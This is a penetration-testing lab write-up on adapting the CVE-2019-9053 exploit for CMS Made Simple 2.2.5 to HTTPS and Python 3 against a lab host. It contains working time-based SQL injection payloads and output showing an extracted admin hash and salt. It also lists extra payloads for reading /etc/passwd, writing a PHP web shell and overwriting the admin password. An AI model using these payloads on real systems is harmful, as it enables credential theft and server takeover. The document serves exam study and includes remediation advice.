# CMS Made Simple 2.2.5 - CVE-2019-9053 Exploit Adaptation for HTTPS

## üéØ Learning Objectives
- Adapt existing exploits for HTTPS targets
- Understand time-based blind SQL injection techniques
- Practice exploit modification for Python 3 compatibility
- Learn manual vulnerability verification methods
- Master SSL/TLS bypass techniques for penetration testing

---

## üìã Target Information

| Parameter | Value |
|-----------|-------|
| **Target IP** | 192.168.165.45 |
| **Protocol** | HTTPS (self-signed certificate) |
| **CMS** | CMS Made Simple 2.2.5 (Wawa) |
| **Vulnerability** | CVE-2019-9053 - Blind Time-Based SQL Injection |
| **Affected Versions** | < 2.2.10 |
| **Attack Vector** | `/moduleinterface.php?mact=News,m1_,default,0` |
| **Authentication Required** | No (unauthenticated exploitation) |

---

## üîç Phase 1: Target Enumeration & Version Discovery

### **Initial Reconnaissance**
```bash
# Test HTTPS connectivity
curl -k -I https://192.168.165.45/
# -k: Ignore SSL certificate validation (self-signed certs)
# -I: HEAD request (headers only)

# Output:
# HTTP/1.1 200 OK
# Server: Apache/2.4.25 (Debian)
```

### **Version Discovery (SSH Access to Target)**
```bash
# On target machine (via SSH)
grep -i "cms_version" /var/www/https/lib/version.php

# Found:
# $CMS_VERSION = "2.2.5";
# $CMS_VERSION_NAME = "Wawa";
```

### **Module Enumeration**
```bash
ls -la /var/www/https/modules/

# Key findings:
# - CMSContentManager (version 1.1.6)
# - CmsJobManager (with test endpoints)
# - CMSMailer
# - News module (vulnerable endpoint)
```

**Time Estimate**: 5-10 minutes

---

## üîé Phase 2: Vulnerability Research

### **SearchSploit Research**
```bash
searchsploit "cms made simple"
searchsploit "cms made simple" | grep -iE "< 2\.2\.10|sql"

# Key finding:
# CMS Made Simple < 2.2.10 - SQL Injection | php/webapps/46635.py
```

### **Exploit Analysis**
```bash
searchsploit -m 46635  # Download exploit
searchsploit -x 46635  # Examine code

# Exploit characteristics:
# - Python 2 script
# - Blind time-based SQL injection
# - Extracts: username, email, password hash, salt
# - Character-by-character enumeration
# - No SSL handling (designed for HTTP)
```

**CVE Details:**
- **CVE-2019-9053**: Unauthenticated SQL Injection in News module
- **Vulnerable Parameter**: `m1_idlist` in `/moduleinterface.php`
- **Technique**: Blind time-based SQL injection using `SLEEP()` function
- **Impact**: Database credential extraction, potential full compromise

**Time Estimate**: 10-15 minutes

---

## üß™ Phase 3: Manual Vulnerability Verification

### **Why Manual Testing Matters**
In OSCP exams, automated tools may fail or be unavailable. Manual verification:
- Confirms vulnerability exists
- Understanding exploitation technique
- Helps troubleshoot exploit failures
- Demonstrates methodology understanding

### **Baseline Timing Test**
```bash
curl -k -w "\nTime: %{time_total}s\n" -o /dev/null -s \
  "https://192.168.165.45/moduleinterface.php?mact=News,m1_,default,0&m1_idlist=a,b,1,5"

# Result: Time: 0.349565s (normal response time)
```

**Flags Explained:**
- `-k` / `--insecure`: Ignore SSL certificate validation
- `-w "Time: %{time_total}s"`: Output total request time
- `-o /dev/null`: Discard response body
- `-s`: Silent mode (no progress bar)

### **Time-Based SQLi Test**
```bash
curl -k -w "\nTime: %{time_total}s\n" -o /dev/null -s \
  "https://192.168.165.45/moduleinterface.php?mact=News,m1_,default,0&m1_idlist=a,b,1,5))+and+(select+sleep(3))+--+"

# Result: Time: 3.593474s (3+ second delay = VULNERABLE!)
```

**SQLi Payload Breakdown:**
```sql
a,b,1,5))           -- Close existing SQL statement
and                 -- Logical AND operator
(select sleep(3))   -- Execute 3-second delay
--+                 -- SQL comment (ignore rest of query)
```

**Verification:**
- ‚úÖ Normal request: ~0.35 seconds
- ‚úÖ Sleep(3) request: ~3.59 seconds
- ‚úÖ Difference: ~3.2 seconds = SQL injection confirmed

**Time Estimate**: 5 minutes

---

## üõ†Ô∏è Phase 4: Exploit Adaptation for HTTPS

### **Required Modifications**

#### **Issue 1: Python 2 ‚Üí Python 3 Compatibility**

**Original Code (Python 2):**
```python
print "[+] Specify an url target"
if hashlib.md5(str(salt) + line).hexdigest() == password:
```

**Adapted Code (Python 3):**
```python
print("[+] Specify an url target")
if hashlib.md5((str(salt) + line).encode('utf-8')).hexdigest() == password:
```

**Changes:**
- Print statements require parentheses in Python 3
- String encoding required for hashlib in Python 3 (`.encode('utf-8')`)

#### **Issue 2: SSL Certificate Validation**

**Problem**: Self-signed certificates cause SSL verification failures
```
ERROR: SSL: CERTIFICATE_VERIFY_FAILED
```

**Solution**: Add SSL verification bypass

**Added at top of script:**
```python
import urllib3

# Suppress SSL warnings for self-signed certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
```

**Modified all requests calls:**
```python
# Original:
r = session.get(url)

# Modified:
r = session.get(url, verify=False)  # Ignore SSL certificate validation
```

#### **Issue 3: HTTPS Protocol**

**No code changes needed** - requests library handles HTTPS natively
- Simply use `https://` in URL instead of `http://`
- Combined with `verify=False` for self-signed certs

### **Complete Adaptation Summary**

| Issue | Original | Adapted | Reason |
|-------|----------|---------|--------|
| **Python Version** | Python 2 syntax | Python 3 syntax | Modern Kali uses Python 3 |
| **Print Statements** | `print "text"` | `print("text")` | Python 3 requirement |
| **String Encoding** | `hashlib.md5(string)` | `hashlib.md5(string.encode())` | Python 3 bytes requirement |
| **SSL Warnings** | Not handled | `urllib3.disable_warnings()` | Suppress console spam |
| **SSL Verification** | Default (verify=True) | `verify=False` | Self-signed certificates |
| **Protocol** | HTTP | HTTPS | Target requirement |

**Time Estimate**: 15-20 minutes

---

## ‚öôÔ∏è Phase 5: Exploit Execution

### **Running the Adapted Exploit**
```bash
python3 46635_https.py -u https://192.168.165.45
```

### **How the Exploit Works**

#### **1. Character Enumeration Technique**
The exploit uses **blind time-based SQLi** to extract data character by character:

```python
dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'

# For each character position:
for i in range(0, len(dictionary)):
    temp = current_value + dictionary[i]
    # Test if database value starts with 'temp'
    payload = f"...+where+username+like+0x{hex_encoded_temp}25+..."  # 25 = '%' wildcard
```

#### **2. Time-Based Detection**
```python
start_time = time.time()
r = session.get(url, verify=False)
elapsed_time = time.time() - start_time

if elapsed_time >= TIME:  # TIME = 1 second
    flag = True  # Character found!
```

**Logic:**
- If response takes ‚â•1 second ‚Üí SLEEP() executed ‚Üí character matches
- If response is fast ‚Üí no SLEEP() ‚Üí character doesn't match
- Repeat for all characters until no more matches found

#### **3. Extraction Order**
1. **Salt** (from `cms_siteprefs` table, `sitepref_name='sitemask'`)
2. **Username** (from `cms_users` table, `user_id=1`)
3. **Email** (from `cms_users` table, `user_id=1`)
4. **Password Hash** (MD5 hash from `cms_users` table)

### **Extracted Credentials**
```
[+] Salt for password found: d9d9574bbadr
[+] Username found: admin
[+] Email found: admin@local6
[+] Password found: 7399c7451f6804edbd8874127fb31a59
```

**Hash Format**: `MD5(salt + plaintext_password)`

**Time Estimate**: 10-30 minutes (depends on data length and network latency)

---

## üîì Phase 6: Password Cracking Attempts

### **Hash Analysis**
- **Hash**: `7399c7451f6804edbd8874127fb31a59`
- **Salt**: `d9d9574bbadr`
- **Format**: MD5(salt + password)

### **Manual Testing with Common Passwords**
```python
import hashlib

salt = "d9d9574bbadr"
target_hash = "7399c7451f6804edbd8874127fb31a59"

for pwd in ["admin", "password", "123456", ...]:
    test_hash = hashlib.md5((salt + pwd).encode('utf-8')).hexdigest()
    if test_hash == target_hash:
        print(f"Password: {pwd}")
```

**Result**: Not found in common password list

### **Wordlist-Based Cracking**
```bash
# Tested with first 10,000 entries from rockyou.txt
# Result: Not found

# Next steps (if needed):
# 1. Full rockyou.txt (~14M passwords)
# 2. Custom wordlist generation
# 3. Hybrid attacks with hashcat
# 4. Alternative exploitation paths
```

### **Alternative Approaches**
1. **Continue cracking**: Run full rockyou.txt or custom wordlists
2. **Password reset**: Look for password reset functionality
3. **SQL injection for direct access**: Modify hash directly in database
4. **File read/write**: Use SQLi to read config files or write web shells
5. **Other vulnerabilities**: Test file upload, RCE in admin panel

**Time Estimate**: Varies (could be seconds to hours depending on password complexity)

---

## üìö Educational Deep Dive: How Did We Know?

### **Q: How do you find SQLi vulnerabilities manually?**

**A: Systematic parameter testing:**

1. **Identify input parameters**:
   ```
   https://target.com/page.php?id=1&sort=name&filter=active
   ```

2. **Test with SQL characters**:
   ```
   ?id=1'          -- Single quote (causes SQL error if vulnerable)
   ?id=1"          -- Double quote
   ?id=1)          -- Parenthesis
   ?id=1' OR '1'='1   -- Boolean-based test
   ```

3. **Time-based detection**:
   ```
   ?id=1' AND SLEEP(5)--+
   ?id=1'; WAITFOR DELAY '00:00:05'--  (MSSQL)
   ?id=1' AND pg_sleep(5)--  (PostgreSQL)
   ```

4. **Observe responses**:
   - Error messages reveal database type
   - Timing differences indicate blind SQLi
   - Different content suggests boolean-based SQLi

### **Q: How do you construct time-based SQLi payloads?**

**A: Understanding SQL injection context:**

**Original Query (guessed)**:
```sql
SELECT * FROM news WHERE news_id IN (1,2,3,4,5)
```

**Our Payload**:
```
m1_idlist=a,b,1,5)) AND (SELECT SLEEP(3))--+
```

**Resulting Query**:
```sql
SELECT * FROM news WHERE news_id IN (a,b,1,5)) AND (SELECT SLEEP(3))--+...)
                                                                    ^ comment ignores rest
```

**Key Techniques**:
- Close existing parentheses: `))`
- Add logical operator: `AND`
- Inject delay function: `SLEEP(3)`, `BENCHMARK()`, etc.
- Comment out rest: `--+` or `#` or `/**/`

### **Q: How do you extract data with blind SQLi?**

**A: Binary search or character enumeration:**

**Method 1: Binary Search (faster)**
```sql
-- Is first character > 'm'?
' AND ASCII(SUBSTRING(username,1,1)) > 109--

-- If yes, test > 't' (116)
-- If no, test > 'f' (102)
-- Continue until exact value found
```

**Method 2: Character Enumeration (simpler)**
```sql
-- Test each character from dictionary
' AND username LIKE 'a%'--  -- Starts with 'a'?
' AND username LIKE 'ad%'-- -- Starts with 'ad'?
' AND username LIKE 'adm%'-- -- Starts with 'adm'?
```

**Exploit uses Method 2**:
```python
payload = "...where+username+like+0x" + hex(ord('a')) + "25+..."  # 'a%'
```

---

## üö® Common Pitfalls & Troubleshooting

### **Problem 1: SSL Certificate Errors**
```
urllib3.exceptions.SSLError: [SSL: CERTIFICATE_VERIFY_FAILED]
```

**Solution:**
```python
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
session.get(url, verify=False)
```

### **Problem 2: Timing False Positives**
**Issue**: HTTPS adds latency, causing timing detection to fail

**Solution**: Increase `TIME` threshold
```python
TIME = 1  # Original
TIME = 2  # For high-latency connections
```

Or measure baseline first:
```python
# Measure normal response time
baseline_time = measure_response_time(normal_request)
TIME = baseline_time + 0.5  # Set threshold above baseline
```

### **Problem 3: Python 2 vs Python 3**
```
SyntaxError: Missing parentheses in call to 'print'
```

**Solution**: Convert all print statements
```python
# Python 2: print "text"
# Python 3: print("text")
```

### **Problem 4: News Module Not Found**
```
HTTP 404 on /moduleinterface.php?mact=News
```

**Solution**: Find other injectable endpoints
```bash
# Check installed modules
ls /var/www/html/modules/

# Test other modules
/moduleinterface.php?mact=Search,m1_,default,0
/moduleinterface.php?mact=CMSMailer,m1_,default,0
```

### **Problem 5: Exploit Hangs**
**Possible causes**:
- No SLEEP() support in database
- WAF/IPS blocking requests
- Network issues

**Debugging**:
```python
# Add verbose output
print(f"[DEBUG] Testing: {url}")
print(f"[DEBUG] Response time: {elapsed_time}s")
```

---

## üîÑ Alternative Exploitation Methods

### **Method 1: Error-Based SQLi**
If errors are displayed:
```
?m1_idlist=1' AND 1=CONVERT(int,(SELECT @@version))--
```

### **Method 2: UNION-Based SQLi**
If results are reflected:
```
?m1_idlist=1 UNION SELECT 1,username,3,password,5 FROM cms_users--
```

### **Method 3: Direct Database Modification**
If UNION works:
```sql
-- Update admin password directly
?m1_idlist=1'; UPDATE cms_users SET password='<new_hash>' WHERE user_id=1--
```

### **Method 4: File Read/Write**
MySQL with FILE privilege:
```sql
-- Read files
' UNION SELECT LOAD_FILE('/etc/passwd')--

-- Write web shell
' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY '<?php system($_GET["cmd"]); ?>'--
```

---

## üìä OSCP Exam Relevance

### **Skills Demonstrated**
| Skill | Exam Relevance | This Exercise |
|-------|----------------|---------------|
| **Exploit Adaptation** | ‚úÖ High | Adapted for HTTPS, Python 3 |
| **Manual Verification** | ‚úÖ High | Manual SQLi testing with curl |
| **Protocol Handling** | ‚úÖ Medium | SSL/TLS bypass techniques |
| **Time Management** | ‚úÖ High | Estimated ~60-90 minutes total |
| **Documentation** | ‚úÖ Medium | Comprehensive writeup created |
| **Troubleshooting** | ‚úÖ High | Multiple adaptation issues solved |

### **Exam Time Estimates**
| Phase | Time | Can Skip? |
|-------|------|-----------|
| Enumeration | 5-10 min | ‚ùå Required |
| Vulnerability Research | 10 min | ‚ùå Required |
| Manual Verification | 5 min | ‚ö†Ô∏è Recommended |
| Exploit Adaptation | 20 min | ‚ùå Required |
| Execution | 15 min | ‚ùå Required |
| **TOTAL MINIMUM** | **50 min** | Critical path |
| **TOTAL REALISTIC** | **90 min** | With troubleshooting |

### **Exam Tips**
1. **Always verify manually first**: Don't trust exploits blindly
2. **Check SSL handling**: Many exploits assume HTTP
3. **Test incrementally**: Verify each adaptation works
4. **Have fallback methods**: If time-based fails, try error-based
5. **Document as you go**: Screenshots and notes throughout

---

## üõ°Ô∏è Defense & Remediation

### **How to Prevent This Attack**

**1. Update CMS Made Simple**
```bash
# Upgrade to version 2.2.10 or later
# This vulnerability is patched in 2.2.10+
```

**2. Input Validation**
```php
// Sanitize user input
$m1_idlist = preg_replace('/[^0-9,]/', '', $_GET['m1_idlist']);

// Use prepared statements
$stmt = $pdo->prepare("SELECT * FROM news WHERE id IN (?)");
$stmt->execute([$m1_idlist]);
```

**3. Web Application Firewall (WAF)**
```
# ModSecurity rules to detect SQLi
SecRule ARGS "@detectSQLi" "id:1,deny,status:403"
```

**4. Database Permissions**
```sql
-- Remove unnecessary privileges
REVOKE FILE ON *.* FROM 'cms_user'@'localhost';
REVOKE PROCESS ON *.* FROM 'cms_user'@'localhost';
```

**5. Rate Limiting**
```apache
# Limit requests to prevent brute-force enumeration
<IfModule mod_evasive24.c>
    DOSHashTableSize 3097
    DOSPageCount 10
    DOSSiteCount 50
    DOSPageInterval 1
    DOSSiteInterval 1
</IfModule>
```

---

## üìù Key Takeaways

### **Technical Skills**
‚úÖ Adapted public exploit for HTTPS target
‚úÖ Fixed Python 2 ‚Üí Python 3 compatibility issues
‚úÖ Implemented SSL verification bypass
‚úÖ Verified vulnerability manually before exploitation
‚úÖ Understood blind time-based SQL injection technique
‚úÖ Extracted database credentials via character enumeration

### **OSCP Methodology**
‚úÖ Systematic enumeration (target ‚Üí version ‚Üí vulnerabilities)
‚úÖ Manual verification (curl testing before automation)
‚úÖ Exploit adaptation (required for exam scenarios)
‚úÖ Time tracking (realistic exam estimates)
‚úÖ Alternative approaches (when primary method fails)
‚úÖ Comprehensive documentation (for exam report)

### **Exploit Adaptation Checklist**
- [ ] Check Python version compatibility (2 vs 3)
- [ ] Handle SSL/TLS for HTTPS targets
- [ ] Verify target accessibility before running
- [ ] Test manually to confirm vulnerability
- [ ] Adjust timing thresholds if needed
- [ ] Have fallback exploitation methods ready
- [ ] Document all changes and reasons

---

## üîó References

- **CVE-2019-9053**: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9053
- **ExploitDB 46635**: https://www.exploit-db.com/exploits/46635
- **CMS Made Simple**: https://www.cmsmadesimple.org/
- **SQL Injection OWASP**: https://owasp.org/www-community/attacks/SQL_Injection
- **Blind SQLi Techniques**: https://owasp.org/www-community/attacks/Blind_SQL_Injection

---

## üìÑ Files Created

```
/home/kali/OSCP/crack/
‚îú‚îÄ‚îÄ 46635.py                              # Original exploit (Python 2)
‚îú‚îÄ‚îÄ 46635_https.py                        # Adapted exploit (Python 3, HTTPS)
‚îî‚îÄ‚îÄ CMS_MADE_SIMPLE_EXPLOIT_ADAPTATION.md # This writeup
```

---

**Total Time Spent**: ~90 minutes (enumeration ‚Üí exploitation ‚Üí documentation)
**Success Criteria**: ‚úÖ Credentials extracted, vulnerability confirmed, methodology documented
**Next Steps**: Password cracking, admin panel access, post-exploitation
